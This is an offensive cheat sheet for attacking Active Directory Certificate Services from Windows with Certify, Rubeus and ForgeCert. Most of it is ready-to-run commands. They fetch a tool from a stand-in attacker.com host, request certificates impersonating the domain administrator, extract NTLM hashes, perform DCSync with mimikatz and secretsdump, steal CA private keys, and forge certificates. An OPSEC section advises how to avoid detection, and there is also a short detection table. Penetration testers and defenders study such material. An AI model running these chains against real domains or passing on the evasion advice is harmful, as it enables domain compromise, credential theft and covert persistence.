# Certify & ForgeCert — Windows-Based AD CS Attacks

---

# Certify — AD CS Enumeration & Exploitation for Windows

## Overview

[Certify](https://github.com/GhostPack/Certify) is a .NET tool for enumerating and abusing AD CS from Windows. It's part of the [GhostPack](https://github.com/GhostPack) suite of security tools. Unlike Certipy (Linux), Certify runs directly on Windows hosts, making it useful for post-exploitation scenarios where you're operating from a compromised domain-joined machine.

## Building Certify

```powershell
# Clone and build with Visual Studio or msbuild
git clone https://github.com/GhostPack/Certify.git
cd Certify
msbuild Certify.sln /p:Configuration=Release

# The binary is at: Certify\bin\Release\Certify.exe
```

## Upload and Execute

```powershell
# From your C2 or using PowerShell
iwr -Uri http://attacker.com/Certify.exe -OutFile Certify.exe
.\Certify.exe
```

## Certify Enumeration Commands

### Basic Find (All Templates and CA Info)

```cmd
Certify.exe find
```

This enumerates:
- All certificate authorities in the domain
- All certificate templates
- ACLs on templates and CA objects
- EKU information
- Enrollment rights

### Find Vulnerable Templates Only

```cmd
Certify.exe find /vulnerable
```

### Find with Specific CA

```cmd
Certify.exe find /ca:"CA-SERVER.domain.local\CA-NAME"
```

### Find with JSON Output

```cmd
Certify.exe find /json

# Pipe to file
Certify.exe find /json > output.json
```

### Show Specific Template Details

```cmd
Certify.exe find /ca:"CA-SERVER\CA-NAME" /template:"VulnTemplate"
```

### Show Enrollment Rights Only

```cmd
Certify.exe find /enrolleeSuppliesSubject
```

### BloodHound Integration

```cmd
Certify.exe find /bloodhound
```

Generates data compatible with BloodHound AD CS attack paths.

## Certify Exploitation Commands

### ESC1 — Request Certificate with Custom SAN

```cmd
Certify.exe request /ca:"CA-SERVER.domain.local\CA-NAME" /template:"VulnTemplate" /altname:"administrator@domain.local"
```

The `/altname` flag specifies the SAN (UPN format) to embed in the certificate request.

### ESC1 — Request with DNS SAN

```cmd
Certify.exe request /ca:"CA-SERVER.domain.local\CA-NAME" /template:"VulnTemplate" /altname:"administrator@domain.local" /domain:"domain.local"
```

### Request with Machine Account

```cmd
Certify.exe request /ca:"CA-SERVER.domain.local\CA-NAME" /template:"Machine" /altname:"administrator@domain.local" /machine
```

The `/machine` flag runs the request in the context of the **machine account** (requires SYSTEM or local admin).

### Enroll with Specific Subject

```cmd
Certify.exe request /ca:"CA-SERVER\CA-NAME" /template:"User" /subject:"CN=administrator" /altname:"administrator@domain.local"
```

### Request with Client Certificate (for ESC3-style)

```cmd
Certify.exe request /ca:"CA-SERVER\CA-NAME" /template:"TargetTemplate" /onbehalfof:"DOMAIN\administrator" /enrollmentagent:"enrollment_agent.pfx" /enrollmentagentpassword:"pass"
```

## Certify + Rubeus — Getting the Hash

After getting a certificate with Certify, use **Rubeus** to get a TGT and extract the hash:

```cmd
# Request TGT with certificate (PFX file)
Rubeus.exe asktgt /user:administrator /domain:domain.local /certificate:cert.pfx /password:"certpassword" /getcredentials

# Request TGT with base64 certificate (from Certify output)
Rubeus.exe asktgt /user:administrator /domain:domain.local /certificate:BASE64CERT /getcredentials

# Request TGT with certificate and use /ptt to inject ticket
Rubeus.exe asktgt /user:administrator /domain:domain.local /certificate:BASE64CERT /ptt
```

### Rubeus Output Parsing

```cmd
Rubeus.exe asktgt /user:administrator /domain:domain.local /certificate:cert.pfx /password:"pass" /getcredentials

# Output includes:
# [*] base64(MD4(dec(kerbkey))) = HASH
# This is the NTLM hash of the user
```

## Certify Full Exploitation Chain (Windows)

### Step 1: Enumerate

```cmd
Certify.exe find /vulnerable
```

### Step 2: Request Certificate

```cmd
Certify.exe request /ca:"CA-SERVER\CA-NAME" /template:"ESC1-Template" /altname:"administrator@domain.local"
```

Certify outputs the certificate in base64 format.

### Step 3: Authenticate with Rubeus

```cmd
# Save base64 cert and use with Rubeus
Rubeus.exe asktgt /user:administrator /domain:domain.local /certificate:<BASE64_CERT> /nowrap /getcredentials
```

### Step 4: Use Hash for DCSync

```cmd
# With the retrieved hash
impacket-secretsdump -hashes LMHASH:NTHASH domain.local/administrator@dc.domain.local
```

Or use **Mimikatz** for DCSync:

```cmd
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt
```

## Certify Context Options

```cmd
# Run as specific user
Certify.exe find /currentuser

# Use thread-level impersonation token
Certify.exe find /threadtoken

# Specify domain controller
Certify.exe find /dc:"dc.domain.local"
```

---

# ForgeCert — Certificate Forging

## Overview

[ForgeCert](https://github.com/GhostPack/ForgeCert) is a .NET tool that takes an **existing CA certificate** (a CA-issued certificate with `CA` issuance policies) and **forges new certificates** for any user. It's useful when:

1. You've compromised a CA server's certificate (from a CA backup, DPAPI, or LSA secrets)
2. You have a CA certificate that has been issued with **Any Purpose EKU** or CA-specific EKU
3. You have a **CA certificate chain** that allows signing new certificates

## How It Works

- A CA certificate has the `CA` bit set in Basic Constraints and can sign subordinate certificates
- ForgeCert uses a legitimate CA certificate to sign a **new end-entity certificate** with custom attributes (UPN, subject, etc.)
- The forged certificate chains up to the domain's trusted root CA
- Domain controllers trust the certificate because it's signed by a trusted CA

## Prerequisites

- A CA certificate (`.pfx` or `.p12`) with its private key
- The password to the CA certificate's private key
- The CA certificate must have CA signing capability (usually true for CA-issued CA certificates, e.g., Enrollment Agent certs can't be used this way)

## ForgeCert Usage

### Basic Command

```cmd
ForgeCert.exe --CertPath "CA-Certificate.pfx" --CertPassword "p@ssw0rd" --Subject "CN=administrator" --NotAfter "12/31/2099"
```

### Full Options

```cmd
ForgeCert.exe ^
    --CertPath "CA-Certificate.pfx" ^
    --CertPassword "p@ssw0rd" ^
    --Subject "CN=administrator, CN=Users, DC=domain, DC=local" ^
    --NotAfter "12/31/2099" ^
    --SAN "administrator@domain.local" ^
    --Issuer "CN=Domain CA, DC=domain, DC=local"
```

### Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--CertPath` | Path to the CA certificate PFX file | Yes |
| `--CertPassword` | Password for the PFX | Yes |
| `--Subject` | Subject of the forged certificate (e.g. CN=administrator) | Yes |
| `--NotAfter` | Expiry date (e.g. 12/31/2099) | Yes |
| `--SAN` | Subject Alternative Name (UPN format) | Recommended |
| `--Issuer` | Override issuer name (optional, usually auto-detected) | No |

## ForgeCert Exploitation Flow

### Step 1: Obtain a CA Certificate

Options for getting a CA certificate:

**a) From CA Backup (IFile COM interface):**
```cmd
# If you have CA admin rights:
certutil -backup C:\temp\backup
# The CA cert is in C:\temp\backup\<CA-NAME>.p12
```

**b) From DPAPI / LSA Secrets on CA Server:**
```cmd
# If you have SYSTEM on the CA server:
mimikatz # privilege::debug
mimikatz # sekurlsa::dpapi
mimikatz # dpapi::capi /in:"C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\*"
```

**c) From Domain Controller (Group Policy - Cert Publishers):**
```cmd
# Enumerate certificates on DCs via LDAP
```

**d) Via ESC2 (Any Purpose EKU):**
```cmd
# If you can request a cert with Any Purpose EKU that has CA issuance capabilities
Certify.exe request /ca:"CA-SERVER\CA-NAME" /template:"AnyPurposeTemplate"
```

### Step 2: Forge Administrator Certificate

```cmd
ForgeCert.exe --CertPath "CA.pfx" --CertPassword "p@ssw0rd" --Subject "CN=administrator" --NotAfter "12/31/2099" --SAN "administrator@domain.local"
```

Output: `forged_cert.pfx`

### Step 3: Authenticate

```cmd
Rubeus.exe asktgt /user:administrator /domain:domain.local /certificate:forged_cert.pfx /password:"forged" /getcredentials

# Or
certipy auth -pfx forged_cert.pfx -dc-ip 192.168.1.10
```

## ForgeCert with Other Tools

```bash
# If you got a CA .p12 from certutil backup
# Convert to PEM
openssl pkcs12 -in CA.p12 -out CA.pem -nodes

# ForgeCert on Windows (from CA.pfx)
ForgeCert.exe --CertPath "CA.pfx" --CertPassword "p@ssw0rd" --Subject "CN=administrator" --NotAfter "12/31/2099" --SAN "administrator@domain.local"

# Or forge on Linux with openssl
openssl x509 -req -in da.csr -CA CA.pem -CAkey CAkey.pem -CAcreateserial -out da.crt -days 365 -extensions v3_req -extfile <(echo -e "[v3_req]\nsubjectAltName=otherName:1.3.6.1.4.1.311.20.2.3;UTF8:administrator@domain.local")
```

## ForgeCert OPSEC

- Forged certificates, if made with a legitimate CA cert, are **indistinguishable from legitimately issued certificates**
- The `Serial Number` will be random but within the CA's serial number space
- The forged cert won't appear in the CA's **Issued Certificates** database — this is the main detection gap
- Choose a `NotAfter` date that blends in with normal CA issuance (e.g., 1 year, not 99 years)
- Do **not** use obvious dates like `12/31/2099` in a production environment — it will stand out

## ForgeCert Detection

| Detection Method | Effectiveness | Notes |
|-----------------|---------------|-------|
| CRL (Certificate Revocation List) | Low | Forged certs won't be in CA database, but CRL only checks revocation |
| CA Issued Certificates Database | **High** | The cert won't appear here — query the CA with `certutil -view` |
| Certificate Transparency (if enabled) | Medium | Windows Server 2022+ CA can log to CT logs |
| AIA (Authority Info Access) | Low | Still chains to CA correctly |
| Certificate Serial Number | Medium | Look for serial numbers that don't follow CA's pattern |
| Event Logs | Low | CA won't log the forged cert issuance (it was never issued by the CA) |

## Summary — Tool Choice

| Scenario | Tool |
|----------|------|
| Linux with domain creds | Certipy — best all-around tool |
| Windows post-exploitation | Certify for enum + request |
| Windows with CA cert | ForgeCert — forge admin certificates |
| Windows authenticated PKINIT | Rubeus |
| Linux authenticated PKINIT | Certipy auth |
| Linux NTLM relay to AD CS | Impacket ntlmrelayx |
| Windows CA backup | certutil + ForgeCert |

## Certipy vs Certify — Command Comparison

| Action | Certipy (Linux) | Certify (Windows) |
|--------|-----------------|-------------------|
| Full enum | `certipy find -u user -p pass` | `Certify.exe find` |
| Vulnerable only | `certipy find -vulnerable` | `Certify.exe find /vulnerable` |
| Request cert | `certipy req -template T -upn admin` | `Certify.exe request /template:T /altname:admin` |
| SAN in request | `-upn user@dom` / `-dns dc.dom` | `/altname:user@dom` |
| Request on behalf | `-on-behalf-of user -pfx agent.pfx` | `/onbehalfof:user /enrollmentagent:agent.pfx` |
| Authenticate | `certipy auth -pfx cert.pfx` | Rubeus `asktgt /certificate:cert` |
| Modify template | `certipy template -write-default-config` | N/A (use ldapmodify/powershell) |
